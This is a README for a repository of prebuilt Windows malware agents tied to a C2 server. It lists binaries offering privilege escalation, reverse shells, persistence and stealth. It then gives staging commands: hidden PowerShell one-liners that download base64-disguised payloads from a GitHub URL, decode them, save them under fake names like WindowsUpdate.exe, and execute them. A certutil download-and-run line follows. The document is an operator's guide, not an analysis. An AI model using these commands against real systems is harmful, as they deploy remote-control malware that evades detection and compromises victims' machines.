# virology-binary

Pre-built agent binaries, updated automatically by CI.

## Files

| File | Description |
|------|-------------|
| `virologie-agent.exe` | COMahawk privesc + RDP + admin + revshell (SYSTEM) |
| `virologie_agent.dll` | Persistence + stealth + revshell (user-level) |
| `update.dat` | Base64-encoded EXE — stealthier staging, no PE header on the wire |
| `config.dat` | Base64-encoded DLL — stealthier staging, no PE header on the wire |

## Staging

Use the C2 server `stage` command for ready-made one-liners. Quick reference below.

### Base64 staging (recommended)

Downloads a `.dat` text file (not a PE binary), decodes on target, executes from `%APPDATA%` with a benign filename.

**EXE (PowerShell, hidden):**
```powershell
powershell -w hidden -ep bypass -c "iwr 'https://raw.githubusercontent.com/GrimalDev/virology-binary/main/update.dat' -OutFile $env:APPDATA\update.dat; $d=[Convert]::FromBase64String((gc $env:APPDATA\update.dat -Raw)); [IO.File]::WriteAllBytes($env:APPDATA+'\WindowsUpdate.exe',$d); rm $env:APPDATA\update.dat; Start-Process $env:APPDATA\WindowsUpdate.exe"
```

**DLL (PowerShell, hidden):**
```powershell
powershell -w hidden -ep bypass -c "iwr 'https://raw.githubusercontent.com/GrimalDev/virology-binary/main/config.dat' -OutFile $env:APPDATA\config.dat; $d=[Convert]::FromBase64String((gc $env:APPDATA\config.dat -Raw)); [IO.File]::WriteAllBytes($env:APPDATA+'\Microsoft\Update.dll',$d); rm $env:APPDATA\config.dat; Start-Process rundll32.exe -ArgumentList $env:APPDATA\Microsoft\Update.dll,Run"
```

### Direct download (noisy, testing only)

```
certutil -urlcache -split -f https://raw.githubusercontent.com/GrimalDev/virology-binary/main/virologie-agent.exe %TEMP%\agent.exe && %TEMP%\agent.exe
```
